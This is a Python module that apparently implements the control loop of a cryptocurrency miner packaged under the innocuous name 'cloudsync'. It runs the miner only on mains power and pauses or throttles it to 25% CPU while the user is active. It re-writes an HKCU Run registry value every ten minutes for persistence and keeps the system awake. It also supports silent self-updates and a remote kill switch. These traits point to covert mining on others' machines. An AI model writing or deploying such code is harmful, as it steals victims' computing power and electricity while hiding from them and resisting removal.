"""The reconcile loop: desired state vs. reality, circuit breakers, runtime.

``Supervisor.tick(now)`` is one pure-ish step.  It never sleeps, never reads the
wall clock behind the caller's back (``now`` is injected, only used as a
fallback), and returns the list of actions it decided - which is what the unit
tests assert on.  ``main()`` is the composition root: mutex, settings, updater
scheduling, kill switch and the real 3 s loop around ``tick``.

Desired state
-------------
The controller only mines on mains power.  A present user is handled two ways,
exactly like the old code:

* when a job object exists (``job_ok``) the worker keeps running and the job's
  CPU rate is capped at 25 % after a 60 s dwell - no restart, the OpenCL context
  is never torn down;
* without a job object the supervisor uses the restart-based ``full``/``trickle``
  profile switch, and when the user is present the worker is stopped outright
  (the original "two independent idle gates").

Circuit breakers
----------------
``closed`` -- normal.
``gpu_open`` -- 2 fast crashes (lived < 30 s): the GPU block is dropped for every
subsequent start and the worker retries CPU-only.
``open`` -- 6 fast crashes: no start for 15 minutes, all attempts suppressed.
``half_open`` -- the 15 minutes elapsed: exactly one probe start is allowed; if
it is another fast crash the breaker re-opens.

A worker that stays alive for ``stable_seconds`` resets the counters to
``closed`` (the GPU block stays dropped until the next real restart, matching the
controller's behaviour).
"""

from __future__ import annotations

import os
import time

from . import lifecycle
from .config.profiles import PROFILES, choose_profile
from .config.settings import DEFAULT_IDLE_SECONDS
from .core.clock import idle_seconds, on_battery
from .core.diagnostics import UNKNOWN, classify
from .core.state import build_payload, write as write_state

#: Stable logger name for this module: every line it emits is prefixed with it.
LOGGER_NAME = "cloudsync.supervisor"

__all__ = [
    "LOGGER_NAME",
    "TICK",
    "ACTIVE_PCT",
    "ACTIVE_DWELL",
    "MIN_PROFILE_DWELL",
    "STATE_INTERVAL",
    "QUIET_SECONDS",
    "GPU_DROP_AFTER",
    "QUIET_AFTER",
    "STABLE_SECONDS",
    "Supervisor",
    "user_active",
    "main",
]

# ---- tunables (overridable from the constructor) ---------------------------
TICK = 3                     # supervisor loop seconds
ACTIVE_PCT = 25              # CPU ceiling while the user is at the keyboard
ACTIVE_DWELL = 60            # only throttle after this long of continuous input
MIN_PROFILE_DWELL = 120      # minimum seconds between profile switches
STATE_INTERVAL = 30          # state.json heartbeat
QUIET_SECONDS = 900          # circuit-breaker open period (= 15 min)
GPU_DROP_AFTER = 2           # fast crashes before the GPU block is dropped
QUIET_AFTER = 6              # fast crashes before the quiet period
STABLE_SECONDS = 300.0       # alive this long -> counters reset
STOP_DWELL = 3.0             # keep a fresh worker up this long before stopping
SWEEP_INTERVAL = 300.0       # orphan sweep cadence
RUN_KEY_INTERVAL = 600.0     # HKCU Run key check cadence


def user_active(idle_threshold=DEFAULT_IDLE_SECONDS):
    """True when the user is at the keyboard (module-level so tests can patch)."""
    try:
        return float(idle_seconds()) < float(idle_threshold)
    except Exception:
        return False


# ---------------------------------------------------------------------------
# Supervisor
# ---------------------------------------------------------------------------


class Supervisor:
    """Reconcile loop for one worker.

    Every dependency the tests need to control is a keyword argument: ``worker``
    (an already-built worker, real or fake), ``worker_factory`` (called with the
    settings when ``worker`` is omitted), ``settings``, ``profiles``, ``clock``,
    ``idle_provider``, ``power_provider``, ``state_path``/``state_writer``,
    ``logger`` and the optional ``sweep``/``run_key``/``awake`` hooks.
    """

    def __init__(self, settings=None, worker=None, *,
                 worker_factory=None,
                 profiles=None,
                 clock=None,
                 idle_provider=None,
                 power_provider=None,
                 state_path=None,
                 state_writer=None,
                 logger=None,
                 stop_dwell=STOP_DWELL,
                 profile_dwell=MIN_PROFILE_DWELL,
                 active_pct=ACTIVE_PCT,
                 active_dwell=ACTIVE_DWELL,
                 state_interval=STATE_INTERVAL,
                 quiet_seconds=QUIET_SECONDS,
                 gpu_drop_after=GPU_DROP_AFTER,
                 quiet_after=QUIET_AFTER,
                 stable_seconds=STABLE_SECONDS,
                 sweep=None,
                 sweep_interval=SWEEP_INTERVAL,
                 run_key=None,
                 run_key_interval=RUN_KEY_INTERVAL,
                 awake=None,
                 tick_seconds=TICK):
        self.settings = settings
        self.profiles = profiles or PROFILES
        self._clock = clock or time.time
        self._idle_provider = idle_provider
        self._power_provider = power_provider
        self._state_path = state_path
        self._state_writer = state_writer
        self._raw_log = _normalise_logger(logger)
        self._log = _named_writer(self._raw_log)
        self._sweep = sweep
        self._run_key = run_key
        self._awake = awake

        self.stop_dwell = float(stop_dwell)
        self.profile_dwell = float(profile_dwell)
        self.active_pct = int(active_pct)
        self.active_dwell = float(active_dwell)
        self.state_interval = float(state_interval)
        self.quiet_seconds = float(quiet_seconds)
        self.gpu_drop_after = int(gpu_drop_after)
        self.quiet_after = int(quiet_after)
        self.stable_seconds = float(stable_seconds)
        self.sweep_interval = float(sweep_interval)
        self.run_key_interval = float(run_key_interval)
        self.tick_seconds = float(tick_seconds)

        self.worker = self._resolve_worker(worker, worker_factory)

        # --- observable state (also what state.json publishes) ------------
        self.idle = 0.0
        self.wanted = False
        self.profile = "full"
        self.cpu_cap_pct = 100
        self.throttled = False
        self.breaker = "closed"       # closed | gpu_open | open | half_open
        self.use_gpu = True
        self.fast_failures = 0
        self.quiet_until = 0.0
        self.last_actions = []

        # --- private timers -----------------------------------------------
        self._started_at = 0.0
        self._last_state = 0.0
        self._last_sweep = 0.0
        self._last_run_key = 0.0
        self._active_since = 0.0
        self._was_alive = False
        self._handled_crashes = 0

    # -- construction ------------------------------------------------------

    def _resolve_worker(self, worker, worker_factory):
        if worker is not None:
            return worker
        if worker_factory is not None:
            # The tests inject the fake worker under any *worker* parameter name,
            # so accept an instance as well as a factory.
            if hasattr(worker_factory, "alive"):
                return worker_factory
            return worker_factory(self.settings)
        if self.settings is None:
            raise TypeError("Supervisor needs a worker or settings")
        from .miner.worker import Worker
        return Worker(self.settings)

    @property
    def idle_threshold(self):
        """Seconds of idle time required before the idle gate opens."""
        value = getattr(self.settings, "idle_seconds", None)
        if value is None:
            value = getattr(self.settings, "idle", DEFAULT_IDLE_SECONDS)
        try:
            return float(value)
        except (TypeError, ValueError):
            return float(DEFAULT_IDLE_SECONDS)

    def __repr__(self):
        return "Supervisor(breaker=%r, profile=%r, wanted=%s, alive=%s)" % (
            self.breaker, self.profile, self.wanted, self.worker.alive())

    def _debug(self, message):
        """Low-volume diagnostic line; still carries the module name prefix."""
        self._log("debug: %s" % message)

    # -- inputs (patchable / injectable) ------------------------------------

    def _now(self, now):
        if now is not None:
            return float(now)
        try:
            return float(self._clock())
        except Exception:
            return time.time()

    def _read_idle(self):
        if self._idle_provider is not None:
            try:
                return float(self._idle_provider())
            except Exception:
                return 0.0
        try:
            return float(idle_seconds())
        except Exception:
            return 0.0

    def _read_mains(self):
        if self._power_provider is not None:
            try:
                return bool(self._power_provider())
            except Exception:
                return True
        try:
            return not bool(on_battery())
        except Exception:
            return True

    def _read_user_active(self, idle):
        threshold = self.idle_threshold
        try:
            return bool(user_active(threshold))
        except TypeError:
            return idle < threshold
        except Exception:
            return idle < threshold

    def _select_profile(self, idle, active):
        try:
            name = choose_profile(idle, active, self.idle_threshold)
        except TypeError:
            name = choose_profile(idle, active)
        except Exception:
            name = "full"
        if name not in self.profiles:
            name = "full"
        return name

    # -- circuit breaker ----------------------------------------------------

    def _sync_breakers(self, now, actions):
        if self.fast_failures < self._handled_crashes:
            self._handled_crashes = self.fast_failures
            return
        if self.fast_failures <= self._handled_crashes:
            return
        self._handled_crashes = self.fast_failures

        if self.fast_failures >= self.quiet_after:
            if self.breaker != "open" or self.quiet_until <= now:
                self.breaker = "open"
                self.quiet_until = now + self.quiet_seconds
                actions.append("quiet")
                self._log("circuit breaker OPEN: %d fast crashes -> %ds quiet"
                          % (self.fast_failures, int(self.quiet_seconds)))
            return

        if self.fast_failures >= self.gpu_drop_after and self.use_gpu:
            self.use_gpu = False
            if self.breaker == "closed":
                self.breaker = "gpu_open"
            try:
                self.worker.use_gpu = False
            except Exception:
                pass
            actions.append("gpu-dropped")
            self._log("GPU circuit-breaker: retrying CPU-only")

    def _quiet_blocks(self, now, actions):
        """True when the quiet period suppresses starts this tick."""
        if self.breaker != "open":
            return False
        if now >= self.quiet_until:
            self.breaker = "half_open"
            self.quiet_until = 0.0
            actions.append("probe")
            self._log("quiet period over - allowing one probe start")
            return False
        actions.append("quiet")
        return True

    def _maybe_recover(self, actions):
        if self.breaker == "closed" and not self.fast_failures:
            return
        try:
            alive = self.worker.alive()
            uptime = float(self.worker.uptime()) if alive else 0.0
        except Exception:
            return
        if alive and uptime >= self.stable_seconds:
            self.fast_failures = 0
            self._handled_crashes = 0
            self.breaker = "closed"
            self.quiet_until = 0.0
            actions.append("recovered")
            self._log("worker stable for %.0fs - circuit breaker closed" % uptime)

    def _detect_crash(self, now, actions):
        reap = getattr(self.worker, "reap", None)
        if callable(reap):
            try:
                reap()
            except Exception as exc:
                self._log("worker reap failed [%s]: %r"
                          % (_owner_tag(exc, "worker"), exc))

        try:
            alive = self.worker.alive()
        except Exception:
            alive = False

        if self._was_alive and not alive:
            actions.append("crash")
            if not hasattr(self.worker, "fast_failures"):
                self.fast_failures += 1

        if hasattr(self.worker, "fast_failures"):
            try:
                self.fast_failures = int(self.worker.fast_failures)
            except (TypeError, ValueError):
                pass
        self._sync_breakers(now, actions)

    # -- worker actions -----------------------------------------------------

    def _start_worker(self, now, profile, actions):
        try:
            started = self.worker.start(profile, gpu=self.use_gpu)
        except TypeError:
            try:
                started = self.worker.start(profile)
            except Exception as exc:
                self._log("worker start failed [%s]: %r" % (_owner_tag(exc, "worker"), exc))
                actions.append("start-failed")
                return False
        except Exception as exc:
            self._log("worker start failed [%s]: %r" % (_owner_tag(exc, "worker"), exc))
            actions.append("start-failed")
            return False
        if started is False:
            actions.append("start-failed")
            self._log("worker did not start")
            return False
        self._started_at = now
        self._active_since = 0.0
        self._was_alive = True
        actions.append("start")
        return True

    def _stop_worker(self, actions):
        stop = getattr(self.worker, "stop", None)
        if callable(stop):
            try:
                stop()
            except Exception as exc:
                self._log("worker stop failed [%s]: %r"
                          % (_owner_tag(exc, "worker"), exc))
        self._started_at = 0.0
        self._was_alive = False
        self._active_since = 0.0
        self.cpu_cap_pct = 100
        self.throttled = False
        self.fast_failures = 0
        self._handled_crashes = 0
        self.breaker = "closed"
        self.quiet_until = 0.0
        try:
            self.worker.throttled = False
        except Exception:
            pass
        actions.append("stop")

    def _switch_worker(self, now, profile, actions):
        switch = getattr(self.worker, "switch", None)
        if not callable(switch):
            actions.append("switch-failed")
            return False
        try:
            switched = switch(profile)
        except Exception as exc:
            self._log("profile switch failed [%s]: %r"
                      % (_owner_tag(exc, "worker"), exc))
            actions.append("switch-failed")
            return False
        if switched is False:
            actions.append("switch-failed")
            return False
        self.profile = profile
        self._started_at = now
        actions.append("switch:%s" % profile)
        return True

    def _apply_cap(self, now, idle, actions):
        if idle >= self.idle_threshold:
            self._active_since = 0.0
            cap = 100
        else:
            if not self._active_since:
                self._active_since = now
            cap = self.active_pct if (now - self._active_since) >= self.active_dwell else 100
        if cap == self.cpu_cap_pct:
            return
        setter = getattr(self.worker, "set_cpu_rate", None)
        applied = False
        if callable(setter):
            try:
                applied = bool(setter(cap))
            except Exception:
                applied = False
        if not applied:
            return
        self.cpu_cap_pct = cap
        self.throttled = cap < 100
        try:
            self.worker.throttled = self.throttled
        except Exception:
            pass
        actions.append("cap:%d" % cap)
        self._log("cpu cap -> %d%% (idle %.0fs)" % (cap, idle))

    # -- state / hooks ------------------------------------------------------

    def build_state(self):
        """Build the state.json payload for this tick (pure, no write)."""
        return build_payload(self.settings, self.worker, self.wanted,
                             self.idle, self.cpu_cap_pct)

    def _write_payload(self, payload):
        if self._state_writer is not None:
            try:
                self._state_writer(payload)
                return True
            except Exception as exc:
                self._log("state write failed [%s]: %r"
                          % (_owner_tag(exc, "state"), exc))
                return False
        if not self._state_path:
            return False
        try:
            write_state(self._state_path, payload)
            return True
        except Exception as exc:
            self._log("state write failed [%s]: %r"
                      % (_owner_tag(exc, "state"), exc))
            return False

    def _ensure_run_key(self):
        """Re-assert the HKCU Run value every ``RUN_KEY_INTERVAL`` (MIGRATION G3).

        The composition root injects ``lifecycle.ensure_run_key`` as the
        ``run_key`` hook; a supervisor built without one falls back to the
        lifecycle helper for a real install (``install.json`` present).  The
        outcome is debug-logged and a failure never aborts the tick.
        """
        try:
            if self._run_key is not None:
                outcome = self._run_key()
            elif self.settings is not None and os.path.isfile(
                    self.settings.path("install.json")):
                writer = _named_writer(self._raw_log, "cloudsync.lifecycle")
                outcome = lifecycle.ensure_run_key(self.settings, writer)
            else:
                self._debug("run key check skipped: no install.json")
                return False
        except Exception as exc:
            self._debug("run key check failed [%s]: %r"
                        % (_owner_tag(exc, "run_key"), exc))
            return False
        self._debug("run key check: ok=%s" % bool(outcome))
        return bool(outcome)

    def _run_hooks(self, now, actions):
        if self._awake is not None:
            try:
                self._awake(bool(self.worker.alive() and self.wanted))
            except Exception:
                pass
        if self._sweep is not None and (now - self._last_sweep) >= self.sweep_interval:
            self._last_sweep = now
            try:
                keep = self.worker.pid if self.worker.alive() else None
            except Exception:
                keep = None
            try:
                self._sweep(keep)
            except TypeError:
                try:
                    self._sweep()
                except Exception:
                    pass
            except Exception:
                pass
        if (now - self._last_run_key) >= self.run_key_interval:
            self._last_run_key = now
            self._ensure_run_key()
        if (self._state_path or self._state_writer) and \
                (now - self._last_state) >= self.state_interval:
            self._last_state = now
            if self._write_payload(self.build_state()):
                actions.append("state")

    # -- the tick -----------------------------------------------------------

    def tick(self, now=None):
        """One reconcile step; returns the list of actions taken.

        ``now`` is the supervisor clock in seconds (tests pass a virtual value).
        No sleeping and no real mining: everything is decided from the injected
        worker, idle/power providers and timers.
        """
        now = self._now(now)
        actions = []

        self._detect_crash(now, actions)

        idle = self._read_idle()
        self.idle = idle
        mains = self._read_mains()
        self.wanted = bool(mains)
        active = self._read_user_active(idle)
        profile = self._select_profile(idle, active)
        self.profile = profile

        job_ok = bool(getattr(self.worker, "job_ok", False))
        if not job_ok:
            can_cap = getattr(self.worker, "can_cap", None)
            if callable(can_cap):
                try:
                    job_ok = bool(can_cap())
                except Exception:
                    job_ok = False

        should_run = bool(mains) and (bool(job_ok) or not active)
        if should_run and self._quiet_blocks(now, actions):
            should_run = False

        try:
            alive = self.worker.alive()
        except Exception:
            alive = False

        if should_run:
            if not alive:
                backoff = 0.0
                try:
                    backoff = float(getattr(self.worker, "backoff_until", 0.0) or 0.0)
                except (TypeError, ValueError):
                    backoff = 0.0
                if now >= backoff:
                    # G2: the restart-based fallback must carry the
                    # choose_profile() result - the reference referenced an
                    # undefined ``profile`` here and spun on NameError.  A job
                    # object keeps the config at "full" (the CPU cap throttles).
                    if job_ok:
                        start_profile = "full"
                    else:
                        start_profile = profile
                    self._start_worker(now, start_profile, actions)
                    self.profile = start_profile
                else:
                    actions.append("backoff")
            elif job_ok:
                self._apply_cap(now, idle, actions)
            else:
                current = getattr(self.worker, "profile", self.profile)
                last = getattr(self.worker, "last_switch", self._started_at)
                try:
                    last = float(last or self._started_at)
                except (TypeError, ValueError):
                    last = self._started_at
                if profile != current:
                    if (now - last) >= self.profile_dwell:
                        self._switch_worker(now, profile, actions)
                    else:
                        actions.append("dwell")
        else:
            if alive:
                if (now - self._started_at) >= self.stop_dwell:
                    self._stop_worker(actions)
                else:
                    actions.append("dwell")

        self._maybe_recover(actions)
        self._run_hooks(now, actions)
        self._was_alive = self.worker.alive()
        self.last_actions = actions
        return actions


# ---------------------------------------------------------------------------
# runtime composition root
# ---------------------------------------------------------------------------


def _normalise_logger(logger):
    if logger is None:
        return lambda _message: None
    if callable(logger):
        return logger
    for name in ("log", "write"):
        method = getattr(logger, name, None)
        if callable(method):
            return method
    return lambda _message: None


def _named_writer(logger, name=LOGGER_NAME):
    """Wrap a log target so every line carries the owning module name.

    Accepts the same shapes as :func:`_normalise_logger` (callable, object with
    ``log``/``write``, or None) and emits ``[<name>] <message>``.
    """
    write = _normalise_logger(logger)

    def emit(message):
        write("[%s] %s" % (name, message))

    return emit


def _owner_tag(exc, hint=None):
    """Short owner module for *exc*, from :func:`core.diagnostics.classify`.

    Returns e.g. ``"miner.worker"`` (the ``cloudsync.`` prefix is dropped so
    log lines stay narrow) or ``"unknown"``.  *hint* names a status keyword used
    only when the exception type itself has no owner (e.g. a bare ``OSError``
    while writing state.json).
    """
    try:
        module = classify(exc)
        if module == UNKNOWN and hint:
            module = classify(hint)
    except Exception:
        module = UNKNOWN
    if module == UNKNOWN:
        return UNKNOWN
    prefix = "cloudsync."
    return module[len(prefix):] if module.startswith(prefix) else module


def _exec_self(log):
    """Re-exec ``python -m cloudsync`` (update / probation rollback restart)."""
    import sys
    executable = sys.executable or "python"
    log("restarting controller (%s -m cloudsync)" % executable)
    try:
        os.execv(executable, [executable, "-m", "cloudsync"])
    except Exception as exc:  # pragma: no cover - only on a broken runtime
        log("re-exec failed [%s]: %r" % (_owner_tag(exc, "supervisor"), exc))


def _teardown(settings, worker, log):
    """Thin compatibility wrapper: teardown is owned by :mod:`cloudsync.lifecycle`."""
    return lifecycle.teardown(
        settings, worker, _named_writer(log, "cloudsync.lifecycle"))


def _bootstrap_legacy(settings, log):
    """Thin compatibility wrapper: adoption is owned by :mod:`cloudsync.lifecycle`."""
    return lifecycle.bootstrap_legacy(
        settings, _named_writer(log, "cloudsync.lifecycle"))


def main(argv=None):
    """Blocking supervisor runtime: the ``python -m cloudsync`` entry point.

    Wires the platform layer (mutex, tasks, power, GPU probe) and the updater
    around :meth:`Supervisor.tick`.  Returns the process exit code (0).  Runtime
    services that are absent or unavailable are skipped, never fatal: a file
    install keeps running even if one optional recovery path is missing.
    """
    _ = argv
    from .config.settings import Settings
    from .core.logging import logger_for
    from .miner.worker import Worker, sweep_orphans
    from .platform import gpu, mutex, power
    from .updater import PROBATION_SECONDS, Updater, handle_probation, remote_kill

    lock = mutex.acquire_single_instance()
    if lock is None:
        return 0

    settings = Settings()
    # Raw writer for modules that name their own lines; this module's lines go
    # through the supervisor-named writer so every line carries its owner.
    log_writer = logger_for(settings.install_dir).write
    log = _named_writer(log_writer)
    log("controller start pid=%s idle_threshold=%ds"
        % (os.getpid(), int(getattr(settings, "idle_seconds",
                                     DEFAULT_IDLE_SECONDS))))
    try:
        if handle_probation(settings.install_dir, log=log_writer):
            _exec_self(log)
        _bootstrap_legacy(settings, log_writer)
        if not os.path.isfile(settings.path("gpu_profile.json")):
            gpu.ensure_profile(settings.install_dir,
                               python=getattr(settings, "python", None) or None)
    except Exception as exc:
        log("startup error [%s]: %r" % (_owner_tag(exc, "settings"), exc))

    worker = Worker(settings, log=log_writer)
    updater = Updater(settings, log=log_writer)
    try:
        sweep_orphans(settings, log=log_writer)
    except Exception:
        pass

    supervisor = Supervisor(
        settings,
        worker,
        state_path=settings.path("state.json"),
        logger=log_writer,
        sweep=lambda keep=None: sweep_orphans(settings, keep=keep, log=log_writer),
        # MIGRATION G3: the supervisor itself owns the 600 s Run-key cycle and
        # calls lifecycle.ensure_run_key (registry write), debug-logging the
        # outcome; nothing has to be injected here.
        awake=power.keep_system_awake,
    )

    probation_at = (time.time() if os.path.isfile(settings.path("update.json"))
                    else 0.0)
    kill_check = 0.0
    last_gpu_check = 0.0

    try:
        while True:
            try:
                now = time.time()

                if os.path.isfile(settings.path("stop.flag")):
                    _teardown(settings, worker, log_writer)

                if now - kill_check > 600:
                    kill_check = now
                    if remote_kill(settings):
                        _teardown(settings, worker, log_writer)

                if probation_at and now - probation_at > PROBATION_SECONDS:
                    probation_at = 0.0
                    try:
                        os.remove(settings.path("update.json"))
                    except OSError:
                        pass
                    log("update probation cleared")

                result = updater.maybe_update()
                if result is True:
                    worker.stop()
                    _exec_self(log)
                elif result == "restart-worker":
                    worker.stop()

                if result:
                    gpu.ensure_profile(settings.install_dir,
                                       python=getattr(settings, "python", None) or None)
                elif not os.path.isfile(settings.path("gpu_profile.json")) and \
                        (now - last_gpu_check) > 120:
                    last_gpu_check = now
                    gpu.ensure_profile(settings.install_dir,
                                       python=getattr(settings, "python", None) or None)

                supervisor.tick(now)
            except KeyboardInterrupt:
                raise
            except Exception as exc:
                log("loop error [%s]: %r" % (_owner_tag(exc, "loop"), exc))
            time.sleep(supervisor.tick_seconds)
    except KeyboardInterrupt:
        try:
            worker.stop()
        except Exception:
            pass
        try:
            power.allow_sleep()
        except Exception:
            pass
    finally:
        try:
            power.allow_sleep()
        except Exception:
            pass
    return 0
